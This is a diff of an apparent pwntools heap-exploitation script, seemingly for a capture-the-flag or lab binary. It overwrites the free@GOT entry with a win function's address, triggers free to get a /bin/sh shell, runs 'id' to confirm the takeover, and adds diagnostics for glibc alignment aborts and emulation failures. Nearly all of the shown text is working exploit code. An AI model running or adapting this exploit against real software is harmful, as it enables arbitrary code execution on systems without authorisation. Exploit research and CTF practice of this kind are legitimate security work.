@@ -88,10 +88,18 @@ try:
     choose(io, 3, 3, p64(win).ljust(0x20, b"\x00"))              # *free@GOT = win
     choose(io, 2, 2)                        # free(valid chunk) -> calls free@GOT -> win() -> /bin/sh
     io.sendline(b"echo BINORACLE_PWNED; id")
-    out = io.recvrepeat(1.5)
+    out = io.recvrepeat(2.0)
     io.close()
     ok = b"BINORACLE_PWNED" in out or b"win reached" in out or b"uid=" in out
-    print("VERIFIED key=%#x free_got=%#x win=%#x" % (key, free_got, win) if ok else "NOT_VERIFIED")
+    if ok:
+        print("VERIFIED key=%#x free_got=%#x win=%#x" % (key, free_got, win))
+    else:
+        # Diagnostics so we can tell WHY: a glibc abort (e.g. 'unaligned tcache chunk' when
+        # free@GOT is not 16-aligned) vs. a silent no-shell (often x86-64 emulation on Apple
+        # Silicon, where the final jump into never-executed code fails but lands on native x86-64).
+        tail = out[-260:].decode("latin-1", "replace").replace("\n", " | ")
+        print("NOT_VERIFIED key=%#x free_got=%#x win=%#x aligned16=%s tail=%r"
+              % (key, free_got, win, (free_got % 16 == 0), tail))
 except Exception as e:
     print("ERROR", e)
     sys.exit(1)
